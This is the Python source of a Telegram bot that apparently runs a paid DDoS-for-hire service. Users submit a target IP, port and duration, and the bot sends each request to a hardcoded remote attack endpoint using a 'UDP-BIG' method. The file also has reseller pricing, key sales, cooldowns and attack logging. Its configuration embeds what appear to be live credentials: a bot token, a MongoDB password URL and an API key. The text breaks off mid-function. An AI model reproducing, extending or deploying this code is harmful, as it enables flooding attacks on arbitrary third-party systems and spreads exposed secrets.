import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import sys
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import requests
import psutil
from collections import defaultdict

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ===== CONFIGURATION (Railway Env Variables with Defaults) =====
BOT_TOKEN = os.getenv(
    "BOT_TOKEN",
    "8996918007:AAF71vW0_YxDEwRQMpKsFChHltgg3Nlw0us"
)

BOT_OWNER = int(os.getenv(
    "BOT_OWNER",
    "8169131537"
))

MONGO_URL = os.getenv(
    "MONGO_URL",
    "mongodb+srv://bobby84888_db_user:laS6C0qE0AWKrbUP@bobbymaster.cnk9aei.mongodb.net/?appName=BOBBYMASTER"
)

API_KEY = os.getenv(
    "API_KEY",
    "qpMZA6JPG7ZDx4gC9cPoO3uO6YLlaOWq"
)

API_BASE_URL = os.getenv(
    "API_BASE_URL",
    "http://13.232.68.73:3938/attack"
)

API_SLOTS = int(os.getenv(
    "API_SLOTS",
    "1"
))

PRIVATE_CHANNEL_LINK = os.getenv(
    "PRIVATE_CHANNEL_LINK",
    "https://t.me/+l-KkkktXzy1jMDll"
)

DEFAULT_PRIVATE_MAX_ATTACK_TIME = int(os.getenv(
    "DEFAULT_PRIVATE_MAX_ATTACK_TIME",
    "300"
))

DEFAULT_GROUP_MAX_ATTACK_TIME = int(os.getenv(
    "DEFAULT_GROUP_MAX_ATTACK_TIME",
    "60"
))

DEFAULT_PRIVATE_COOLDOWN = int(os.getenv(
    "DEFAULT_PRIVATE_COOLDOWN",
    "30"
))

DEFAULT_GROUP_COOLDOWN = int(os.getenv(
    "DEFAULT_GROUP_COOLDOWN",
    "120"
))

DEFAULT_CONCURRENT_LIMIT = API_SLOTS


def _mask(s, keep=6):
    if not s:
        return "<empty>"
    s = str(s)
    return s[:keep] + "..." + s[-4:] if len(s) > keep + 4 else "***"


print("=" * 60, flush=True)
print("🔧 RESOLVED CONFIG", flush=True)
print(f"  BOT_TOKEN        = {_mask(BOT_TOKEN, 10)}", flush=True)
print(f"  BOT_OWNER        = {BOT_OWNER}", flush=True)
print(f"  MONGO_URL        = {_mask(MONGO_URL, 30)}", flush=True)
print(f"  API_KEY          = {_mask(API_KEY, 6)}", flush=True)
print(f"  API_BASE_URL     = {API_BASE_URL}", flush=True)
print(f"  API_SLOTS        = {API_SLOTS}", flush=True)
print(f"  CHANNEL_LINK     = {PRIVATE_CHANNEL_LINK}", flush=True)
print(f"  PRIVATE_MAX      = {DEFAULT_PRIVATE_MAX_ATTACK_TIME}s", flush=True)
print(f"  PRIVATE_COOLDOWN = {DEFAULT_PRIVATE_COOLDOWN}s", flush=True)
print(f"  GROUP_MAX        = {DEFAULT_GROUP_MAX_ATTACK_TIME}s", flush=True)
print(f"  GROUP_COOLDOWN   = {DEFAULT_GROUP_COOLDOWN}s", flush=True)
print("=" * 60, flush=True)

# ===== MongoDB Connect with Retry =====
print("Connecting to MongoDB...", flush=True)


def _connect_mongo(url, attempts=5, delay=5):
    last_err = None
    for i in range(attempts):
        try:
            c = MongoClient(url, serverSelectionTimeoutMS=5000)
            c.admin.command("ping")
            return c
        except Exception as e:
            last_err = e
            print(f"MongoDB attempt {i + 1}/{attempts} failed: {e}", flush=True)
            time.sleep(delay)
    raise SystemExit(f"MongoDB unreachable after {attempts} attempts: {last_err}")


try:
    client = _connect_mongo(MONGO_URL)
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']

    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    groups_collection = db['groups']

    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)

    print("MongoDB connected successfully!", flush=True)
except Exception as e:
    print(f"MongoDB connection error: {e}", flush=True)
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# ===== PRIVATE CHANNEL =====
PRIVATE_CHANNEL_NAME = "PRIVATE CHANNEL"


def get_private_channel_id():
    return get_setting('private_channel_id', None)


def set_private_channel_id(cid):
    set_setting('private_channel_id', cid)


# ===== API LIST - SLOTS =====
API_TEMPLATE = f"{API_BASE_URL}?ip={{ip}}&port={{port}}&time={{duration}}&key={API_KEY}&SLOT={{slot}}"
API_LIST = [API_TEMPLATE.replace("{slot}", str(i)) for i in range(1, API_SLOTS + 1)]

# ===== RESELLER PRICING =====
RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}


# ===== SETTINGS FUNCTIONS =====
def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default


def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )


def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price


update_reseller_pricing()


def get_private_max_attack_time():
    try:
        return int(get_setting('private_max_attack_time', DEFAULT_PRIVATE_MAX_ATTACK_TIME))
    except:
        return DEFAULT_PRIVATE_MAX_ATTACK_TIME


def get_group_max_attack_time():
    try:
        return int(get_setting('group_max_attack_time', DEFAULT_GROUP_MAX_ATTACK_TIME))
    except:
        return DEFAULT_GROUP_MAX_ATTACK_TIME


def get_private_cooldown():
    try:
        return int(get_setting('private_cooldown', DEFAULT_PRIVATE_COOLDOWN))
    except:
        return DEFAULT_PRIVATE_COOLDOWN


def get_group_cooldown():
    try:
        return int(get_setting('group_cooldown', DEFAULT_GROUP_COOLDOWN))
    except:
        return DEFAULT_GROUP_COOLDOWN


def get_user_cooldown_setting(is_group=False):
    if is_group:
        return get_group_cooldown()
    return get_private_cooldown()


def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', DEFAULT_CONCURRENT_LIMIT))
    except:
        return DEFAULT_CONCURRENT_LIMIT


def _xcfg(v=None):
    if v is None:
        return get_setting('_cx_th', DEFAULT_CONCURRENT_LIMIT)
    set_setting('_cx_th', v)


def is_maintenance():
    return get_setting('maintenance_mode', False)


def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')


def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)


def get_blocked_ips():
    return get_setting('blocked_ips', [])


def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False


def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False


def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False


def get_port_protection():
    settings = bot_settings_collection.find_one({})
    if settings:
        return settings.get('port_protection', True)
    return True


def get_channel_required():
    return True


def set_channel_required(enabled):
    pass


def get_ddos_protection():
    return get_setting('ddos_protection', True)


def set_ddos_protection(enabled):
    set_setting('ddos_protection', enabled)


def get_approved_groups():
    return get_setting('approved_groups', [])


def add_approved_group(group_id):
    approved = get_approved_groups()
    if group_id not in approved:
        approved.append(group_id)
        set_setting('approved_groups', approved)
        return True
    return False


def remove_approved_group(group_id):
    approved = get_approved_groups()
    if group_id in approved:
        approved.remove(group_id)
        set_setting('approved_groups', approved)
        return True
    return False


def is_group_approved(group_id):
    approved = get_approved_groups()
    return group_id in approved


def get_feedback_enabled():
    return get_setting('feedback_enabled', True)


def set_feedback_enabled(enabled):
    set_setting('feedback_enabled', enabled)


def get_reel_enabled():
    return get_setting('reel_enabled', True)


def set_reel_enabled(enabled):
    set_setting('reel_enabled', enabled)


def get_reel_list():
    reels = get_setting('reel_list', [])
    return reels if isinstance(reels, list) else []


def add_reel(file_id):
    reels = get_reel_list()
    if file_id not in reels:
        reels.append(file_id)
        set_setting('reel_list', reels)
        return True
    return False


def remove_reel(index):
    reels = get_reel_list()
    if 0 <= index < len(reels):
        removed = reels.pop(index)
        set_setting('reel_list', reels)
        return removed
    return None


def get_random_reel():
    reels = get_reel_list()
    if reels:
        return random.choice(reels)
    return None


# ===== ANTI-DDOS PROTECTION =====
class DDOSProtection:
    def __init__(self):
        self.user_requests = defaultdict(list)
        self.chat_requests = defaultdict(list)
        self.blocked_users = set()
        self.global_counter = 0
        self.global_reset = time.time()
        self.attack_history = defaultdict(list)
        self.enabled = True

    def is_ddos_attack(self, user_id, chat_id):
        if not self.enabled:
            return False
        now = time.time()
        if user_id in self.blocked_users:
            return True
        if now - self.global_reset > 1:
            self.global_counter = 0
            self.global_reset = now
        self.global_counter += 1
        if self.global_counter > 30:
            print(f"🌐 Global rate limit exceeded: {self.global_counter} RPS")
            time.sleep(0.1)
            return True
        self.user_requests[user_id] = [t for t in self.user_requests[user_id] if now - t < 5]
        if len(self.user_requests[user_id]) >= 5:
            self.blocked_users.add(user_id)
            print(f"🚫 Blocked spammer user: {user_id}")
            return True
        self.chat_requests[chat_id] = [t for t in self.chat_requests[chat_id] if now - t < 5]
        if len(self.chat_requests[chat_id]) >= 20:
            print(f"📊 Chat rate limit: {len(self.chat_requests[chat_id])} req/5s")
            time.sleep(0.05)
            return True
        self.user_requests[user_id].append(now)
        self.chat_requests[chat_id].append(now)
        return False


protection = DDOSProtection()


def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False


def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            bot.reply_to(message,
                         f"🚫 𝗧𝗨𝗠 𝗧𝗘𝗠𝗣𝗢𝗥𝗔𝗥𝗬 𝗕𝗔𝗡 𝗛𝗢!\n\n⏳ Expiry: {expiry_str}\n❌ Tum abhi kuch nahi kar sakte.\n\n📞 Contact Your Seller")
            return True
        bot.reply_to(message,
                     f"🚫 𝗧𝗨𝗠 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡 𝗛𝗢!\n\n❌ Tum kuch nahi kar sakte.\n\n📞 Contact Your Seller")
        return True
    return False


def check_channel_join(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER or is_reseller(user_id):
        return True

    channel_id = get_private_channel_id()
    if not channel_id:
        print("⚠️ private_channel_id not set! Owner must run /setchannel <id>")
        return True

    try:
        member = bot.get_chat_member(channel_id, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"⚠️ Channel check error: {e}")

    bot.reply_to(message,
                 f"❌ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟!\n\n"
                 f"⚠️ Attack karne ke liye pehle channel join karna zaroori hai.\n"
                 f"🚫 Key ki zaroorat NAHI hai — sirf join karo aur attack karo.\n\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"📢 𝗝𝗢𝗜𝗡 𝗛𝗘𝗥𝗘:\n"
                 f"🔗 {PRIVATE_CHANNEL_LINK}\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n\n"
                 f"Join karne ke baad /verify use karo,\n"
                 f"phir /attack <ip> <port> <time> bhej do ✅"
                 )
    return False


def check_group_approval(message):
    chat_id = message.chat.id
    if message.chat.type in ['private', 'personal']:
        return True
    if message.from_user.id == BOT_OWNER:
        return True
    if is_group_approved(chat_id):
        return True
    bot.reply_to(message,
                 f"❌ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗!\n\n"
                 f"This group is not approved for attacks.\n\n"
                 f"📢 Group ID: `{chat_id}`\n\n"
                 f"Contact owner to approve this group.\n"
                 f"Owner can use: /addgrp {chat_id}",
                 parse_mode="Markdown"
                 )
    return False


import threading as _threading
import time as _time

_attack_lock = _threading.Lock()


def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one({'_id': user['_id']}, {'$set': {'key_expiry': new_expiry}})
            _time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            _time.sleep(10)


extender_thread = _threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}
bot_start_time = datetime.now()

pending_feedback = {}


def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {"target": target, "port": port, "duration": duration, "timestamp": datetime.now()}


def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)


def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]


def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })


def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None


def is_owner(user_id):
    return user_id == BOT_OWNER


def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None


def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})


def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    return None, None


def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    if not user or not user.get('key_expiry'):
        return False
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    return True


def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"


def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"


def get_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)


def set_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)


def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)


def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False


def get_max_concurrent():
    return len(API_LIST)


def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None


def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False


def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        if parse_mode:
            bot.reply_to(message, text, parse_mode=parse_mode)
        else:
            bot.reply_to(message, text)
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    if parse_mode:
                        bot.reply_to(message, part, parse_mode=parse_mode)
                    else:
                        bot.reply_to(message, part)
                else:
                    if parse_mode:
                        bot.send_message(message.chat.id, part, parse_mode=parse_mode)
                    else:
                        bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass


def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass


def _call_single_api(slot_index, url, target, port, duration):
    try:
        response = requests.get(url, timeout=10)
        print(f"[API SLOT {slot_index + 1}] Target: {target}:{port} | Status: {response.status_code} | Response: {response.text}",
              flush=True)
    except Exception as e:
        print(f"[API SLOT {slot_index + 1}] Target: {target}:{port} | Error: {e}", flush=True)


def generate_attack_start_ui(target, port, duration, user_id):
    return f'''🚀 Attack Started!
📍 {target}:{port}
⏱ Duration: {duration}s
👤 User: {user_id}
📊 Monitor: Type /status to see live progress'''


def generate_attack_complete_ui(target, port, duration, show_private_link=False):
    msg = f'''🚀 Attack Finished!
📍 {target}:{port}
⏱ Duration: {duration}s
📝 Please submit feedback'''
    if show_private_link:
        msg += f'''


━━━━━━━━━━━━━━━━━━━━
📢 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
🔗 {PRIVATE_CHANNEL_LINK}
━━━━━━━━━━━━━━━━━━━━'''
    return msg


def generate_global_status_ui():
    get_active_attack_count()
    attacks = list(active_attacks.items())
    if not attacks:
        return "🚀 No active attacks right now."

    header = "🚀 𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 𝗦𝗧𝗔𝗧𝗨𝗦 🚀\n━━━━━━━━━━━━━━━━━━━━"
    body = ""
    for idx, (attack_id, info) in enumerate(attacks[:10], 1):
        remaining = (info['end_time'] - datetime.now()).total_seconds()
        if remaining < 0:
            continue
        total_dur = info['duration']
        elapsed = total_dur - remaining
        percent = int((elapsed / total_dur) * 100) if total_dur > 0 else 0

        filled = int(percent / 5)
        empty = 20 - filled
        bar = "█" * filled + "▒" * empty

        user_id = info.get('user_id', 'Unknown')
        user_type = "Private" if not info.get('is_group', False) else "Group"

        body += f"""
💢 𝗧𝗮𝗿𝗴𝗲𝘁: {info['target']}:{info['port']}
⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {int(remaining)}s | 👤 𝗕𝘆: {user_id} (👤 {user_type})
📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {bar} {percent}%
"""
    footer = "━━━━━━━━━━━━━━━━━━━━"
    return header + body + footer


def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        log_attack(user_id, username, target, port, duration)
        if not is_owner(user_id) and get_feedback_enabled():
            set_pending_feedback(user_id, target, port, duration)
        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
        method = "UDP-BIG"
        attack_start_msg = generate_attack_start_ui(target, port, duration, user_id)

        try:
            if get_reel_enabled():
                reel_id = get_random_reel()
                if reel_id:
                    bot.send_video(
                        message.chat.id,
                        reel_id,
                        caption=attack_start_msg,
                        supports_streaming=True
                    )
                else:
                    if is_owner(user_id):
                        bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
                    else:
                        bot.reply_to(message, attack_start_msg)
            else:
                if is_owner(user_id):
                    bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
                else:
                    bot.reply_to(message, attack_start_msg)
        except Exception as e:
            print(f"Reel send error: {e}")
            if is_owner(user_id):
                bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
            else:
                bot.reply_to(message, attack_start_msg)

        api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
        try:
            t = threading.Thread(target=_call_single_api, args=(api_index, api_url, target, port, duration))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"[API SLOT {api_index + 1}] Launch Error: {e}", flush=True)
        time.sleep(duration)
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            remaining_cooldown = 0
            if user_id in user_cooldowns:
                remaining_cooldown = max(0, int((user_cooldowns[user_id] - datetime.now()).total_seconds()))
        show_link = (not is_owner(user_id)) and (not has_valid_key(user_id))
        complete_msg = generate_attack_complete_ui(target, port, duration, show_private_link=show_link)
        if is_owner(user_id):
            bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}")
        else:
            bot.reply_to(message, complete_msg)
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]


@bot.message_handler(commands=['reel_on'])
def reel_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(True)
    bot.reply_to(message, "✅ Reel feature ENABLED! Har attack ke sath reel bheja jayega.")


@bot.message_handler(commands=['reel_off'])
def reel_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(False)
    bot.reply_to(message, "✅ Reel feature DISABLED! Sirf text message bheja jayega.")


@bot.message_handler(commands=['addreel'])
def add_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    if not message.reply_to_message:
        bot.reply_to(message, "⚠️ Kisi video message ko reply karke /addreel likho.")
        return
    if message.reply_to_message.video:
        file_id = message.reply_to_message.video.file_id
    elif message.reply_to_message.animation:
        file_id = message.reply_to_message.animation.file_id
    else:
        bot.reply_to(message, "❌ Sirf video ya GIF (animation) add kar sakte ho.")
        return
    if add_reel(file_id):
        count = len(get_reel_list())
        bot.reply_to(message, f"✅ Reel added! Total reels: {count}")
    else:
        bot.reply_to(message, "⚠️ Ye reel pehle se add hai.")


@bot.message_handler(commands=['removereel'])
def remove_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removereel <index>\nUse /listreels to see indexes.")
        return
    try:
        index = int(parts[1]) - 1
    except:
        bot.reply_to(message, "❌ Invalid index! Number daalo.")
        return
    removed = remove_reel(index)
    if removed:
        bot.reply_to(message, f"✅ Reel #{index + 1} remove kar di gayi.")
    else:
        bot.reply_to(message, "❌ Invalid index! Use /listreels to see correct index.")


@bot.message_handler(commands=['listreels'])
def list_reels_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    reels = get_reel_list()
    if not reels:
        bot.reply_to(message, "📋 Koi reel nahi hai. /addreel se add karo.")
        return
    response = "📋 𝗥𝗘𝗘𝗟 𝗟𝗜𝗦𝗧\n\n"
    for i, fid in enumerate(reels, 1):
        response += f"{i}. `{fid[:10]}...`\n"
    response += f"\nTotal: {len(reels)} reels"
    bot.reply_to(message, response, parse_mode="Markdown")


@bot.message_handler(commands=["verify"])
def verify_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    if user_id == BOT_OWNER or is_reseller(user_id):
        bot.reply_to(message, "✅ Owner/Reseller — no check needed.")
        return

    channel_id = get_private_channel_id()
    if not channel_id:
        bot.reply_to(message, "⚠️ Owner ne channel set nahi kiya. Abhi attack allowed hai.")
        return

    try:
        member = bot.get_chat_member(channel_id, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            bot.reply_to(message,
                         f"✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n\n"
                         f"Ab tum direct /attack <ip> <port> <time> bhej sakte ho.\n"
                         f"🔑 Key ki zaroorat NAHI hai! 🚀"
                         )
        else:
            bot.reply_to(message,
                         f"❌ Tumne channel join nahi kiya!\n\n"
                         f"🔗 {PRIVATE_CHANNEL_LINK}\n\n"
                         f"Join karo, phir /verify karo."
                         )
    except Exception as e:
        print(f"Verify error: {e}")
        bot.reply_to(message,
                     f"❌ Verification failed.\n\n"
                     f"Channel join karo: {PRIVATE_CHANNEL_LINK}\n"
                     f"Phir /verify karo."
                     )


@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    bot.reply_to(message, f"`{message.from_user.id}`", parse_mode="Markdown")


@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = users_collection.count_documents({})
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    ddos_status = "✅ ON" if get_ddos_protection() else "❌ OFF"
    approved_count = len(get_approved_groups())
    reel_count = len(get_reel_list())
    reel_status = "✅ ON" if get_reel_enabled() else "❌ OFF"
    feedback_status = "✅ ON" if get_feedback_enabled() else "❌ OFF"
    channel_status = "✅ SET" if get_private_channel_id() else "⚠️ NOT SET"
    response = f"🏓 Pong!\n\n• Response: {response_time}ms\n• Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maintenance_status}\n• Channel: {channel_status}\n• Key Required: ❌ NO\n• DDoS: {ddos_status}\n• Groups: {approved_count}\n• Uptime: {uptime_str}\n• Reels: {reel_count} ({reel_status})\n• Feedback: {feedback_status}\n• Max Slots: {len(API_LIST)}\n\n⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\n⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
    bot.reply_to(message, response)


@bot.message_handler(commands=["setchannel"])
def set_channel_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
                     "⚠️ Usage: /setchannel <channel_id>\n\n"
                     "Example: /setchannel -1001234567890\n\n"
                     f"📢 Invite link: {PRIVATE_CHANNEL_LINK}\n\n"
                     "💡 Channel ID nikalne ke liye: kisi bhi message ko @userinfobot pe forward karo."
                     )
        return
    try:
        cid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid channel ID! Numeric hona chahiye (e.g. -1001234567890)")
        return

    try:
        chat = bot.get_chat(cid)
        bot_member = bot.get_chat_member(cid, bot.get_me().id)
        if bot_member.status not in ['administrator', 'creator']:
            bot.reply_to(message,
                         f"⚠️ Bot admin nahi hai us channel me!\n"
                         f"Bot ko admin banao, phir try karo."
                         )
            return
        set_private_channel_id(cid)
        bot.reply_to(message,
                     f"✅ Private channel set!\n\n"
                     f"📢 Channel: {chat.title if hasattr(chat, 'title') else cid}\n"
                     f"🆔 ID: {cid}\n\n"
                     f"🔗 Invite: {PRIVATE_CHANNEL_LINK}\n\n"
                     f"Ab users ko sirf channel join karna hoga — key ki zaroorat NAHI! 🚀"
                     )
    except Exception as e:
